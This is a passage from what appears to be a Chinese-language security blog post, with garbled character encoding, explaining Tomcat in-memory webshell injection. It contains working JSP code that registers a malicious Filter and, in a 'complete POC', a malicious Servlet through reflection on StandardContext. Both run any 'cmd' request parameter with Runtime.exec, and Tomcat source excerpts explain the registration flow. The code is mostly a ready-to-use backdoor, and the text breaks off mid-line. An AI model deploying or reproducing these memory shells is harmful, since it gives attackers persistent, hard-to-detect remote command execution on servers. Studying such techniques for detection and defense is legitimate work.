appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line">%&gt;</span><br><span class="line"> <span class="comment">//æ¶æ„Filterï¼Œä¸»è¦æ˜¯doFilteræ–¹æ³•</span></span><br><span class="line">&lt;%! <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Filter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%<span class="comment">//ä½¿ç”¨FilterDefå°è£…filter</span></span><br><span class="line">    <span class="type">Shell_Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Filter</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;CommonFilter&quot;</span>;</span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(name);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"> <span class="comment">//åˆ›å»ºfilterMapï¼ŒfilterMapç”¨äºè·¯ç”±æ˜ å°„</span></span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(name);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"> <span class="comment">//åå°„å°è£…filterConfigåŠfilterDefåˆ°filterConfigs </span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"> </span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line">    filterConfigs.put(name, filterConfig);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div><p>å…ˆæ³¨å†Œæ¶æ„Filter</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/Java_Shell_war_exploded/Filter.jsp</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010440959.png"                      alt="image-20230201044023838"                ><figcaption>image-20230201044023838</figcaption></figure></p><h3 id="Servletå‹"><a href="#Servletå‹" class="headerlink" title="Servletå‹"></a>Servletå‹</h3><p>å…ˆåˆ›å»ºä¸€ä¸ªæ¶æ„Servlet</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jakarta.servlet.*;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;Shell_Servlet&quot;, value = &quot;/shell&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Servlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (IOException | NullPointerException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010555517.png"                      alt="image-20230201055527413"                ><figcaption>image-20230201055527413</figcaption></figure></p><p>æ¥ç€éœ€è¦å®ç°åŠ¨æ€æ³¨å†ŒServlet</p><h4 id="Servletåˆ›å»ºæµç¨‹"><a href="#Servletåˆ›å»ºæµç¨‹" class="headerlink" title="Servletåˆ›å»ºæµç¨‹"></a>Servletåˆ›å»ºæµç¨‹</h4><p>Servletçš„ç”Ÿå‘½å‘¨æœŸåˆ†ä¸ºå¦‚ä¸‹äº”éƒ¨åˆ†</p><ol><li>åŠ è½½ï¼šå½“Tomcatç¬¬ä¸€æ¬¡è®¿é—®Servletçš„æ—¶å€™ï¼ŒTomcatä¼šè´Ÿè´£åˆ›å»ºServletçš„å®ä¾‹</li><li>åˆå§‹åŒ–ï¼šå½“Servletè¢«å®ä¾‹åŒ–åï¼ŒTomcatä¼šè°ƒç”¨<code>init()</code>æ–¹æ³•åˆå§‹åŒ–è¿™ä¸ªå¯¹è±¡</li><li>å¤„ç†æœåŠ¡ï¼šå½“æµè§ˆå™¨è®¿é—®Servletçš„æ—¶å€™ï¼ŒServlet ä¼šè°ƒç”¨<code>service()</code>æ–¹æ³•å¤„ç†è¯·æ±‚</li><li>é”€æ¯ï¼šå½“Tomcatå…³é—­æ—¶æˆ–è€…æ£€æµ‹åˆ°Servletè¦ä»Tomcatåˆ é™¤çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨<code>destroy()</code>æ–¹æ³•ï¼Œè®©è¯¥å®ä¾‹é‡Šæ”¾æ‰æ‰€å çš„èµ„æºã€‚ä¸€ä¸ªServletå¦‚æœé•¿æ—¶é—´ä¸è¢«ä½¿ç”¨çš„è¯ï¼Œä¹Ÿä¼šè¢«Tomcatè‡ªåŠ¨é”€æ¯</li><li>å¸è½½ï¼šå½“Servletè°ƒç”¨å®Œ<code>destroy()</code>æ–¹æ³•åï¼Œç­‰å¾…åƒåœ¾å›æ”¶ã€‚å¦‚æœæœ‰éœ€è¦å†æ¬¡ä½¿ç”¨è¿™ä¸ªServletï¼Œä¼šé‡æ–°è°ƒç”¨<code>init()</code>æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–æ“ä½œ</li></ol><blockquote><p>Wrapperæ˜¯å¯¹Servletçš„æŠ½è±¡å’ŒåŒ…è£…ï¼Œæ¯ä¸ªContextå¯ä»¥æœ‰å¤šä¸ªWrapperï¼ŒWrapperä¸»è¦è´Ÿè´£ç®¡ç† Servlet ï¼ŒåŒ…æ‹¬çš„ Servlet çš„è£…è½½ã€åˆå§‹åŒ–ã€æ‰§è¡Œä»¥åŠèµ„æºå›æ”¶,ä¹Ÿæ˜¯æ¥ä¸‹æ¥æ³¨å†Œæ¶æ„Servletçš„å…³é”®</p></blockquote><h4 id="åˆ›å»ºStandardWrapper"><a href="#åˆ›å»ºStandardWrapper" class="headerlink" title="åˆ›å»ºStandardWrapper"></a>åˆ›å»ºStandardWrapper</h4><p>åœ¨<code>StandardContext</code>#<code>startInternal</code>ä¸­ï¼Œè°ƒç”¨äº†<code>fireLifecycleEvent()</code>æ–¹æ³•è§£æweb.xmlæ–‡ä»¶</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">fireLifecycleEvent</span><span class="params">(String type, Object data)</span> &#123;</span><br><span class="line">        <span class="type">LifecycleEvent</span> <span class="variable">event</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LifecycleEvent</span>(<span class="built_in">this</span>, type, data);</span><br><span class="line">        <span class="keyword">for</span> (LifecycleListener listener : lifecycleListeners) &#123;</span><br><span class="line">            listener.lifecycleEvent(event);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>æœ€ç»ˆé€šè¿‡<code>ContextConfig#webConfig()</code>æ–¹æ³•è§£æweb.xmlè·å–å„ç§é…ç½®å‚æ•°</p></blockquote><p>ç„¶åé€šè¿‡<code>configureContext(webXml)</code>æ–¹æ³•åˆ›å»ºStandWrapperå¯¹è±¡ï¼Œå¹¶æ ¹æ®è§£æå‚æ•°åˆå§‹åŒ–StandWrapperå¯¹è±¡</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">configureContext</span><span class="params">(WebXml webxml)</span> &#123;</span><br><span class="line">        <span class="comment">// As far as possible, process in alphabetical order so it is easy to</span></span><br><span class="line">        <span class="comment">// check everything is present</span></span><br><span class="line">        <span class="comment">// Some validation depends on correct public ID</span></span><br><span class="line">        context.setPublicId(webxml.getPublicId());</span><br><span class="line"> </span><br><span class="line">...   <span class="comment">//è®¾ç½®StandardContextå‚æ•°</span></span><br><span class="line"> </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//åˆ›å»ºStandardWrapperå¯¹è±¡</span></span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//è®¾ç½®LoadOnStartupå±æ€§</span></span><br><span class="line">                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//è®¾ç½®ServletNameå±æ€§</span></span><br><span class="line">            wrapper.setName(servlet.getServletName());</span><br><span class="line">            Map&lt;String,String&gt; params = servlet.getParameterMap();</span><br><span class="line">            <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">                wrapper.addInitParameter(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line">            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">            <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;</span><br><span class="line">                wrapper.addSecurityReference(</span><br><span class="line">                        roleRef.getName(), roleRef.getLink());</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//è®¾ç½®ServletClasså±æ€§</span></span><br><span class="line">            wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">            ...</span><br><span class="line">            wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//å°†åŒ…è£…å¥½çš„StandWrapperæ·»åŠ è¿›ContainerBaseçš„childrenå±æ€§ä¸­</span></span><br><span class="line">            context.addChild(wrapper);</span><br><span class="line"> </span><br><span class="line">           <span class="keyword">for</span> (Entry&lt;String, String&gt; entry :</span><br><span class="line">                webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">          </span><br><span class="line">            <span class="comment">//æ·»åŠ è·¯å¾„æ˜ å°„</span></span><br><span class="line">            context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>æœ€åé€šè¿‡<code>addServletMappingDecoded()</code>æ–¹æ³•æ·»åŠ Servletå¯¹åº”çš„urlæ˜ å°„</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addServletMappingDecoded</span><span class="params">(String pattern, String name,</span></span><br><span class="line"><span class="params">                                  <span class="type">boolean</span> jspWildCard)</span> &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) findChild(name);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><h4 id="åŠ è½½StandWrapper"><a href="#åŠ è½½StandWrapper" class="headerlink" title="åŠ è½½StandWrapper"></a>åŠ è½½StandWrapper</h4><p>æ¥ç€åœ¨<code>StandardContext#startInternal</code>æ–¹æ³•é€šè¿‡<code>findChildren()</code>è·å–<code>StandardWrapper</code>ç±»</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Container child : findChildren()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!child.getState().isAvailable()) &#123;</span><br><span class="line">        child.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>æœ€åä¾æ¬¡åŠ è½½å®ŒListenerã€Filteråï¼Œå°±é€šè¿‡<code>loadOnStartUp()</code>æ–¹æ³•åŠ è½½wrapper</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">loadOnStartup</span><span class="params">(Container children[])</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Collect &quot;load on startup&quot; servlets that need to be initialized</span></span><br><span class="line">    TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (Container child : children) &#123;</span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) child;</span><br><span class="line">        <span class="type">int</span> <span class="variable">loadOnStartup</span> <span class="operator">=</span> wrapper.getLoadOnStartup();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//åˆ¤æ–­å±æ€§loadOnStartupçš„å€¼</span></span><br><span class="line">        <span class="keyword">if</span> (loadOnStartup &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">key</span> <span class="operator">=</span> Integer.valueOf(loadOnStartup);</span><br><span class="line">        ArrayList&lt;Wrapper&gt; list = map.get(key);</span><br><span class="line">        <span class="keyword">if</span> (list == <span class="literal">null</span>) &#123;</span><br><span class="line">            list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            map.put(key, list);</span><br><span class="line">        &#125;</span><br><span class="line">        list.add(wrapper);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Load the collected &quot;load on startup&quot; servlets</span></span><br><span class="line">    <span class="keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Wrapper wrapper : list) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                wrapper.load();<span class="comment">//åŠ è½½Servlet</span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>æœ€åçš„pocä¸­éœ€è¦æ³¨æ„<code>loadOnStartup</code>å±æ€§çš„è®¾ç½®ï¼Œåªæœ‰å¤§äº0æ‰ä¼šè¢«æ”¾å…¥listï¼Œè¿›è€Œè¢«åŠ è½½<code>wrapper.load()</code></p></blockquote><h4 id="åŠ¨æ€æ³¨å†ŒServlet"><a href="#åŠ¨æ€æ³¨å†ŒServlet" class="headerlink" title="åŠ¨æ€æ³¨å†ŒServlet"></a>åŠ¨æ€æ³¨å†ŒServlet</h4><p>é€šè¿‡ä¸Šé¢çš„åˆ†æå¯ä»¥æ€»ç»“æµç¨‹</p><ol><li>è·å–<code>StandardContext</code>å¯¹è±¡</li><li>ç¼–å†™æ¶æ„Servlet</li><li>é€šè¿‡<code>StandardContext.createWrapper()</code>åˆ›å»º<code>StandardWrapper</code>å¯¹è±¡</li><li>è®¾ç½®<code>StandardWrapper</code>å¯¹è±¡çš„<code>loadOnStartup</code>ã€<code>ServletName</code>ã€<code>ServletClass</code>å±æ€§å€¼</li><li>å°†<code>StandardWrapper</code>å¯¹è±¡æ·»åŠ è¿›<code>StandardContext</code>å¯¹è±¡çš„<code>children</code>å±æ€§ä¸­</li><li>é€šè¿‡<code>StandardContext.addServletMappingDecoded()</code>æ·»åŠ å¯¹åº”çš„è·¯å¾„æ˜ å°„</li></ol><h4 id="å®Œæ•´POCé“¾"><a href="#å®Œæ•´POCé“¾" class="headerlink" title="å®Œæ•´POCé“¾"></a>å®Œæ•´POCé“¾</h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%<span class="comment">//å¾—åˆ°StandardContextå¯¹è±¡</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%!</span><br><span class="line"> <span class="comment">//æ¶æ„Servlet</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Servlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%<span class="comment">//åˆ›å»ºStandardWrapperå¹¶è®¾ç½®å¯¹åº”å±æ€§</span></span><br><span class="line">    <span class="type">Shell_Servlet</span> <span class="variable">shell_servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Servlet</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> shell_servlet.getClass().getSimpleName();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);<span class="comment">//ä¸èƒ½å°äº0</span></span><br><span class="line">    wrapper.setName(name);</span><br><span class="line">    wrapper.setServlet(shell_servlet);</span><br><span class="line">    wrapper.setServletClass(shell_servlet.getClass().getName());</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%<span class="comment">//ç»‘å®šè·¯ç”±</span></span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span 